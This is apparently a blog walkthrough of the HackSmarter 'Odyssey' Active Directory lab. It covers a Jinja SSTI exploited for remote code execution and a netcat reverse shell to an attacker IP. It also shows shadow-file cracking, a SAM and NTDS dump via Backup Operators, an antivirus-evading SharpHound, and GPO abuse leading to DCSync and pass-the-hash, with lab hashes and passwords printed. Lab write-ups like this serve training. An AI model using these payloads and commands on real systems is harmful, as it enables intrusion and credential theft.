---
title: "HackSmarter Odyssey Walkthrough  "
date: 2026-06-08 00:00:00 +0000
categories: [ HackSmarterlabs]
tags: [Hacksmarterlabs , Active Directory]
---

<img width="2784" height="1504" alt="image" src="https://github.com/user-attachments/assets/0fa82f23-5b66-4fcc-addb-566d2fd71c8b" />


## Objective / Scope

You are a member of the Hack Smarter Red Team and have been assigned to perform a black-box penetration test against a client's critical infrastructure. There are three machines in scope: one Linux web server and two Windows enterprise hosts.

The client’s environment is currently in a degraded state due to ongoing migration efforts; the Domain Controllers are experiencing synchronization failures. Consequently, standard automated LDAP enumeration tools (such as BloodHound) are expected to fail or return unreliable data. The client wants to assess if an attacker can thrive in this "broken" environment where standard administrative tools are malfunctioning.

Note From The Author
Odyssey was built off a recent engagement that I had where the DC's were not syncing correctly. This caused a lot of problems during the engagement. We also had to go through a proxy, which made tools like LDAP very hard to use. Your normal tools may fail... can you think outside the box?

## Solution : 

First we start by scanning all machines : 

<img width="1814" height="790" alt="image" src="https://github.com/user-attachments/assets/ab3c393a-31d2-4391-8066-273340fcc0f1" />

From the open ports , we can tell that we have A DC , a windows machine and a web server . Once the scans were done this is what we could conclude : 

DC-01 : The Domain controller (Obviously) we see port 88 and DNS and ldap so we can confirm as well . 

WKST-01 : A Windows workstation with RDP open on it . 

Web-01 : This is a Linux machine hosting a Web server on port 5000 and an SSH server .

First before we start we need to add the Domain names , Hostnames to our /etc/hosts file , we can use nxc for it . 

<img width="1684" height="567" alt="image" src="https://github.com/user-attachments/assets/6653516f-be36-4f76-bfd6-d792aa0a1d62" />

Now the first thing i always try to do is get a list of usernames that we can use for ASREPROASTING, to do so i like to use nxc to check for Null authentication .

<img width="1069" height="565" alt="image" src="https://github.com/user-attachments/assets/d337aed6-93b7-44b3-85bf-34bcd85985ad" />

Didn't work , tried checking shares as well as the guest account bu that didn't work either . 

<img width="1187" height="784" alt="image" src="https://github.com/user-attachments/assets/ab06c91a-58d2-4a61-a98c-8875efe24971" />

Enumerating RPC and ldap didn't return anything useful either .

<img width="1082" height="332" alt="image" src="https://github.com/user-attachments/assets/69e1a6e6-b751-4de0-b4fb-54f271f3252d" />

Tried checking the shares on the other windows workstation but that didn't work either . The way here is definetly through the Web server . 

Before we go deeper : One thing i like to keep in mind when doing an lab that involves AD is this quick checklist :

```bash
Scan All TCP Ports : Check The useful note Down for more info .
Check ldap , rpc , smb with anonymous access . Check for Public Shares .
Find Usernames : Find usernames in Web Site and generate a Username List maybe . if you get access , Look for usernames using netexec , –rid-brute , –users and enumdomuser with RPC client .
Check usernames found with kerbrute .
Search for ASREP Roastable Users .
Once we have valid Creds : Check Kerberoastable users + Spray the password on all users .
Try to authenticate using every protocol .
Enumerate shares with those Users found . Use netexec to download .
Check Certipy for Vulnerable Templates if there is an ADCS in place .
If we get a Shell , try privesc , dump all Hashes using netexec or locally and store into a file .
If we can’t privesc , we can move to Blood Hound .
```

Now let's enumerate each machine separately starting with the web app . 

### Web-01 !

If we navigate to the web app , we get this Ping function : 

<img width="1071" height="677" alt="image" src="https://github.com/user-attachments/assets/fbbe72a9-4843-4aae-8ac7-b020426052d1" />

Since i saw a Ping , i thought maybe the way is through a command injection , but when i try to enter an IP address it just gets rendered back to us . 

<img width="866" height="475" alt="image" src="https://github.com/user-attachments/assets/5e5c0311-cd8c-4da0-8a43-20f4e1f86acd" />

Whatever we type , we get that Rendered back to us .

<img width="725" height="471" alt="image" src="https://github.com/user-attachments/assets/5b8f7bda-efb5-4086-bba9-0cc0028361ef" />

First thing we should think of is an SSTI injection . I already have a detailed section on my Web metthodology on how to detect and exploit an SSTI : 

```bash
https://elmehdilaassiri.github.io/posts/web-app-pentesting-methodology/#ssti-
```

Now to test for it i used this simple payload : {{7*7}} , depending on the response we will know if this web app is actually vulnerable or not , if we get 49 it means our code was actually executed . 

<img width="903" height="461" alt="image" src="https://github.com/user-attachments/assets/2b6c02e3-ecfe-433b-bc2e-25970275433f" />

Perfect our code was executed which means we have an SSTI , now after that we need to know which engine is being used . Again we inject a payload and based on the response rendered to us , we will know which one . 

We can follow this Guide to know which engine is being used . 

```bash
https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/
```

<img width="1002" height="519" alt="image" src="https://github.com/user-attachments/assets/7ad9a1f8-92c5-47c9-a3d1-e8976c6f94fe" />

Now we follow this diagram . Injecting {{7*'7'}} : 

<img width="868" height="402" alt="image" src="https://github.com/user-attachments/assets/f8263f71-8952-43c7-bc17-63999310d572" />

This works , so it is either Jinja or Twig . 

I started by injecting a payload for Twig that can cause RCE and i got this error : 
{% raw %}
```bash
# 1/ Information Disclosure :
{{ _self }}

# 2/ LFI :
{{ "/etc/passwd"|file_excerpt(1,-1) }}

# 3/ RCE :
{{ ['id'] | filter('system') }}
```
{% endraw %}
<img width="1083" height="671" alt="image" src="https://github.com/user-attachments/assets/6632c7c7-e545-4ae3-8d09-f30ee81ccc44" />

We clearly see that this is running Jinja . 
{% raw %}
```bash
# 1/ Information Disclosure :
{{ config.items() }}
{{ self.__init__.__globals__.__builtins__ }}

# 2/ LFI :
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}

# 3/ RCE :
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
{% endraw %}
Now if we run the payload for RCE : 

<img width="854" height="463" alt="image" src="https://github.com/user-attachments/assets/9cbbd952-d9fa-4d10-b836-6541bc4ad3d5" />

This works perfectly , now all we have to do is turn this into an reverse shell . I first checked if the machine had netcat . 

{% raw %}
```bash
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('which nc').read() }}
```
{% endraw %}

<img width="717" height="430" alt="image" src="https://github.com/user-attachments/assets/ab32f547-3093-44dc-b3c2-606f1a4ad1eb" />

Now we just search for a nc reverse shell . 

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.200.62.214 4445 >/tmp/f
```

<img width="1055" height="525" alt="image" src="https://github.com/user-attachments/assets/28c4bfe0-fee2-498b-9d4c-f369fab6dc86" />

If we execute it , we see that it hangs which is a good sign now if we go back to our listener : 

<img width="840" height="396" alt="image" src="https://github.com/user-attachments/assets/a0bd7161-1638-48f0-9938-13133d4c2c99" />

Perfect now we've got our Foothold . Now first thing i always do is try and stabilize our shell . 

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
background 
stty raw -echo; fg
export TERM=xterm
PS1='\[\e[31m\]\u\[\e[96m\]@\[\e[35m\]\H\[\e[0m\]:\[\e[93m\]\w\[\e[0m\]\$'
```

<img width="1165" height="617" alt="image" src="https://github.com/user-attachments/assets/374e0c66-8554-43a0-ad9d-146571358245" />

Now before i import Linpeas , i like to check some quick wins , i already have a small section inside my OSCP methodology (feel free to check it ) : 

```bash
id : Check for Groups and Which user . 
cat /etc/passwd : Check other users on the machine . 
sudo -l : which prog can be ran with root perm . 
uname -sr / lsb_relase -a : Version + architecture .  
find / -type f -perm -04000 -ls 2>/dev/null : Find binaries with SUID . 
Check for Bash History . 
If we can Write into a file and execute it as anOTher user , always put a RevShell there .
If you get Creds always test for password Reuse . 
cat /etc/fstab : if there is an nfs . 
sudo -V : check sudo version for privesc . 

# Readable files : (SSH Keys are most important here) :
find / -readable -type f -group ghill_sa 2>/dev/null

# Kenrel PrivEsc : 
uname -a : Check the kernel version and check if it has privesc vectors . 

# SUID Binaries : 

We see that there is an added s into who can RWX on that file or executable which makes
it an SUID , now if we can execute a rev shell with that SUID , it will always give us a
root shell . There are a lot of legit SUID binaries that we can't exploit but if we find
an unusual one , we should look into it .  

find / -type f -perm -04000 -ls 2>/dev/null

wget http://10.10.14.139/pspy
./pspy 
# Look for UID=0  ===> those are ran by Root . 
```

<img width="921" height="600" alt="image" src="https://github.com/user-attachments/assets/4f0f49ca-9e27-4c9b-a38c-802e4b359f5c" />

We see that our user can read some SSH files . which shouldn't be allowed , let's import them back to our kali , modify the permissions and try to login using them . 

<img width="1852" height="660" alt="image" src="https://github.com/user-attachments/assets/4d27ec0e-8b10-43cb-8ef8-d6051fac5821" />

Now that we have a private key we can attempt to use it , we don't know this key is for which user . 

<img width="944" height="343" alt="image" src="https://github.com/user-attachments/assets/9d58d320-dc1e-4988-bced-d44d1dc80aa8" />

If we check the users who have a Shell on the machine , we can see the root user , ghill user as well , so let's try to login using the SSH key using  one of these 2 users .

<img width="1049" height="760" alt="image" src="https://github.com/user-attachments/assets/7d758241-8d68-4265-b4e8-6a1c9dc4ab0b" />

Perfect , the Key is for the Root user not ghill , Huge security risk . Now i tried looking for any Kerberos Files on the machine like these 2 : 

/etc/krb5.conf — reveals the realm, KDC address, and confirms AD domain membership
/etc/krb5.keytab — if readable, contains principal keys that allow direct TGT requests without knowing the password

<img width="744" height="344" alt="image" src="https://github.com/user-attachments/assets/0ef906c6-d8a6-4a26-a705-f7b4bc1a47ac" />

But i couldn't find any of them sadly . 

Now usually Once we fully compromise a Linux machine , it's always good practice to crack the /etc/shadow file , as this might give us some additional passwords we can use for spraying , i got a small section on my OSCP methodology on how to crack the shadows file . 

```bash

# Cracking Shadow file : 
unshadow pass shadow > unshadow
john --wordlist=/usr/share/wordlists/rockyou.txt unshadow

# DICTIONARY CRACKING sha512crypt HASHES WITH rockyou.txt
john --wordlist=rockyou.txt --format=sha512crypt hashes.txt

# DICTIONARY CRACKING MD5 HASHES WITH rockyou.txt
john --format=Raw-MD5 --wordlist=rockyou.txt hashes.txt

# DICTIONARY CRACKING NTLM HASHES WITH rockyou.txt
john --format=NT --wordlist=rockyou.txt hashes.txt
```

First we import the shadow and the passwd file : 

<img width="1818" height="790" alt="image" src="https://github.com/user-attachments/assets/eb3a5009-5bd8-4eff-973a-d48b1e22703c" />

Then we crack them and hope we get a password . 

<img width="896" height="594" alt="image" src="https://github.com/user-attachments/assets/d858900c-2762-4c44-acbe-7ea6be56963c" />

We get the root password : "P@ssw0rd!" 

I first tried to check if it is reused by the user ghill to authenticate to the domain, we can use nxc for that : 

<img width="1309" height="657" alt="image" src="https://github.com/user-attachments/assets/23b49ee7-6b11-4610-9c77-7506b65d7c50" />

We see that we can't authenticate to the domain , but the user is a Local user on the Windows workstation . 


### EC2AMAZ-NS87CNK :

Now we know that the user ghill is a local user on the machine , let's first check the sares then what type of access our user has , whether he can rdp or winrm . 

<img width="1368" height="576" alt="image" src="https://github.com/user-attachments/assets/0f05cf25-cb90-4ddc-940e-6acf7c94421f" />

Pretty weird , our user has read access over the Admin share and Write over all the other shares , with Write access i tried Uploading a INK file using nxc and use Responder to try and capture some Hashes but that didn't return anything useful . 

Before we check the Shares, let's RDP into the machine to enumerate it further . 

```bash
xfreerdp3 /v:EC2AMAZ-NS87CNK /u:ghill_sa /p:'P@ssw0rd!'  /cert:ignore +clipboard /dynamic-resolution 
```

<img width="1475" height="548" alt="image" src="https://github.com/user-attachments/assets/edbed7d6-231f-4bdf-be6f-852c0f521f4d" />

Checking the Documents , Desktop and all the other folders of the ghill_sa user , we find nothing useful . 

But if we check the shares : 

<img width="1414" height="782" alt="image" src="https://github.com/user-attachments/assets/7be90149-6db9-469c-852b-0bd07c3d8f26" />

We find these Creds , i tried validating them , but they don't seem to be Real users . 

<img width="890" height="738" alt="image" src="https://github.com/user-attachments/assets/e26c5b32-ab3f-4686-b378-f811a4231b72" />

For now let's see if we can elevate our privileges on the machine . 

Before i import Winpeak or Powerup , first let's check the Groups as well as the Tokens , maybe we can get some quick wins . 

<img width="1197" height="758" alt="image" src="https://github.com/user-attachments/assets/b3125cf5-1b72-4d2c-9c1c-db2893e7ae00" />

Perfect , we are part of the Backup Operators group. This is very good news since we can create a backup for the SAM DB and dump hashes that way , I already have a step by step guide on my OSCP methdology : 

```bash
====> If you want to dump only local users : 

On Windows : 

cd c:\ 
mkdir temp 
cd temp
reg save hklm\sam c:\temp\sam
reg save hklm\system c:\temp\system 
copy sam,system \\TSCLIENT\share\ 

On kali :

secretsdump.py -sam sam -system systsem local . 

====> If you want to dump all users on domain (u need ntds file , requires us to be on the DC for this ) . 

On Kali : 

nano viper.dsh : Inside of it type : 
set context persistent nowriters 
add volume c: alias viper 
create 
expose %viper% x: 

unix2dos viper.dsh 

On Windows : 

upload viper.dsh : We need to import the file onto the machine (use upload on evilwinrm or impacket smbserver or iwr ...) 
powershell -c iwr -uri http://KaliIP\viper.dsh -o viper.dsh 

diskshadow /s viper.dsh 
robocopy /b x:\windows\ntds . ntds.dit 
reg save hklm\system c:\windows\temp\system 

On Kali : 

impacket-secretsdump -ntds ntds.dit -system SYSTEM local 

```

In our case we will be following the first section since this is a normal workstation and not the DC , but if you ever come across a user on the DC that is part of BackupOperator group , you can follow the second part to dump the NTDS file . 

First we open a PS shell (Run it as Administrator) , then copy the sam and System files . 

<img width="761" height="584" alt="image" src="https://github.com/user-attachments/assets/69f48790-e51f-485b-b68f-ebf3ea65613f" />

Now to transfer the files , i already have a Shared drive (from the xfree rdp command). The location is always \\TSCLIENT\sharename\ . In our case the name is Shared : 

```bash
==> RDP command : 
xfreerdp3 /v:EC2AMAZ-NS87CNK /u:ghill_sa /p:'P@ssw0rd!'  /cert:ignore +clipboard /dynamic-resolution /drive:.,Shared

==> File Transfer :
cd c:\temp
move * \\TSCLIENT\shared
```

<img width="942" height="679" alt="image" src="https://github.com/user-attachments/assets/bbfa6bbe-385a-4fa9-b76e-000b205364fb" />

Now back to our Kali machine we can use secretsdump to dump the SAM . 

<img width="1483" height="790" alt="image" src="https://github.com/user-attachments/assets/dc232e8e-9ace-4b53-9d1e-57b96d1dbbd3" />

A lot of local users :)

### DC01 :

I tried authenticating with all of them using their hashes to the domain , to see which users are Domain users, that we can use to enumerate the Domain further . 

<img width="1462" height="649" alt="image" src="https://github.com/user-attachments/assets/78a8dda0-2032-47c6-86a5-67e830e1f517" />

Finally we find a Domain User , Now we can generate a list of valid domain users , test for ASREPROASTING , Kerberoasting , password Spraying then if we find nothing we can check Bloodhound ACLs . 

```bash
nxc smb DC01.hsm.local -u bbarkinson -H 53c3709ae3d9f4428a230db81361ffbc --rid-brute --rid-brute  | grep -i 'sidtypeuser' | awk '{print$6}' | cut -d '\' -f 2 | tee all_users
```

<img width="1145" height="276" alt="image" src="https://github.com/user-attachments/assets/12a55782-d7aa-4849-bc05-03ee521d3d09" />

Looking at it , very  few users to have ASREPROASTING , but still let's test it . 

```bash
==> Asreproasting:
impacket-GetNPUsers  hsm.local/ -dc-ip DC01.hsm.local -usersfile all_users -outputfile Hashes.txt

==> Kerberoasting :
nxc ldap DC01.hsm.local -u bbarkinson -H 53c3709ae3d9f4428a230db81361ffbc --kerberoasting kerb_hash
```

<img width="1388" height="546" alt="image" src="https://github.com/user-attachments/assets/1cacb821-190d-49bf-a6fd-5d5e39bcfcca" />

Nothing useful , let's try and run BloodHound , maybe we can find Important ACLs for the compromised user that we can abuse , here are the steps to setup Bloodhound :

```bash
# To get the ZIP file :
nxc ldap $target -u 'hellyr' -p 'H3lenaR!2025' --bloodhound --collection All --dns-server $target
# To run BloodHound : 
https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart
wget https://github.com/SpecterOps/bloodhoun  d-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
sudo ./bloodhound-cli install
./bloodhound-cli resetpwd
Visit : http://localhost:8080/ui/login 
```

Unfortunately this didn't work : 

<img width="1659" height="380" alt="image" src="https://github.com/user-attachments/assets/2188e8a9-6a84-4b2b-b1e6-e091ac854b36" />

This is normal since they mentionned it in the Objective section .

Now i did import Sharphound to the machine via our shared drive but due to the machine having an AV , it automatically blocks Sharphound . 

Apparently there is this obfuscated version of Sharphound that we can use to try and bypass the AV . 

```bash
https://github.com/Flangvik/ObfuscatedSharpCollection/blob/main/NetFramework_4.7_Any/SharpHound.exe._obf.exe
```

We easily import it using our Shared drive . 

<img width="1597" height="463" alt="image" src="https://github.com/user-attachments/assets/1a71ae2c-5c3d-40b4-8d50-7091266a1e9d" />

Again this didn't work since it can't resolve the DC DNS name -_- , so the only way will be to run sharphound right on the DC machine haha . let's see if our user can access the DC via WINRM or rdp  . 

<img width="1515" height="261" alt="image" src="https://github.com/user-attachments/assets/317e0735-53c9-410e-a261-d47adb1eaa4f" />

This is perfect , our user can Winrm to the DC01 , let's login via evil-winrm then import our Sharphound exe via evil-winrm and run it . 

<img width="1129" height="769" alt="image" src="https://github.com/user-attachments/assets/5241334f-4005-4e74-abcd-1aad8fa10bcc" />

Now we just run it and Download it via evil-wirm : 

<img width="1468" height="637" alt="image" src="https://github.com/user-attachments/assets/4d4bb81f-1786-4ec4-abef-add7fcd3b633" />

Finally we inject this zip file into Bloodhound . 

<img width="1596" height="676" alt="image" src="https://github.com/user-attachments/assets/7f9c5f71-4af6-4fd6-b10a-b608527c0966" />

We can see that our user has GenericWrite over a GPO — this is a critical security misconfiguration, as it can be abused to create a scheduled task that adds a new user to the Domain Admins group. Once the GPO applies, we can use the newly created account to perform a DCSync attack and dump all domain credentials.

To do this we can use a tool like GPOabuse which will automate this for us , by default the tool will create this user john user to local administrators group (Password: H4x00r123..)

All we need are Valid Creds for the user who has generic write and the GPO ID , which can be found via Blooodhound or in the SYSVOL share . 

<img width="1257" height="593" alt="image" src="https://github.com/user-attachments/assets/5d573ed5-ccab-498b-a0d7-6a0586474710" />

```bash
git clone https://github.com/Hackndo/pyGPOAbuse
cd pyGPOAbuse
==> To run it 
python3 pygpoabuse.py 'hsm.local'/'bbarkinson' -hashes ':53c3709ae3d9f4428a230db81361ffbc' -gpo-id "526CDF3A-10B6-4B00-BCFA-36E59DCD71A2" -f
```

<img width="1789" height="589" alt="image" src="https://github.com/user-attachments/assets/82be9a5b-a964-43a1-83af-d4421855c422" />

Now either we wait for it to execute or we can force a GPO refresh using our winrm shell so that it executes immediately : 

<img width="1086" height="754" alt="image" src="https://github.com/user-attachments/assets/2b679aea-e7c3-4586-ab62-0efe9e8c7a82" />

Now we use our new user to dump the ntds file and get all Hashes . 

<img width="1567" height="398" alt="image" src="https://github.com/user-attachments/assets/5b7762fa-46b5-4500-971a-348e5cec256d" />

Now for the flags :

The First user flag can be found in the Root directory on machine WEB01 . 

<img width="1026" height="530" alt="image" src="https://github.com/user-attachments/assets/a5323cb8-b9fb-4bea-92d3-483fe57c21b7" />

The Second user flag is in the Administrator Desktop of EC2AMAZ-NS87CNK : We can connect via PSexec since we already have the Hash of the Administrator via SAM dump . 

I tried PSexec , SMBsexec , wmi2exec , but they all didn't work -_- , finally i used a tool called atexec which creates a task for each command : 

```bash
==> These 2 Worked but broke immediately after 1 command :

smbexec.py administrator@EC2AMAZ-NS87CNK.hsm.local -hashes :d5cad8a9782b2879bf316f56936f1e36
psexec.py administrator@EC2AMAZ-NS87CNK.hsm.local -hashes :d5cad8a9782b2879bf316f56936f1e36

==> These 2 didn't even work .

python3 wmiexec2.py administrator@EC2AMAZ-NS87CNK.hsm.local -hashes :d5cad8a9782b2879bf316f56936f1e36
wmiexec.py administrator@EC2AMAZ-NS87CNK.hsm.local -hashes :d5cad8a9782b2879bf316f56936f1e36

==> Again Worked once but broke immediately : 
atexec.py administrator@EC2AMAZ-NS87CNK.hsm.local -hashes :d5cad8a9782b2879bf316f56936f1e36 "whoami"
```

Finally i gave up and used smbclient to be able to read the C$ Share and get the root that way -_- :

```bash
smbclient.py -hashes :d5cad8a9782b2879bf316f56936f1e36 administrator@10.1.26.225
```
<img width="1304" height="747" alt="image" src="https://github.com/user-attachments/assets/65b365f7-d49f-4465-97bf-88134d2e5b33" />

From there we find the second flag in the Administrator's Desktop :

<img width="1143" height="536" alt="image" src="https://github.com/user-attachments/assets/93d845bd-b049-4fc3-b0fa-105050a7c5ff" />

And for the Last flag , it's in the Administrator Desktop . 

<img width="1042" height="461" alt="image" src="https://github.com/user-attachments/assets/feaeaf9e-ef1e-48f6-81e8-529eb2721456" />

That was all for this lab , Hope you learned something from it . See you in the next one :) 
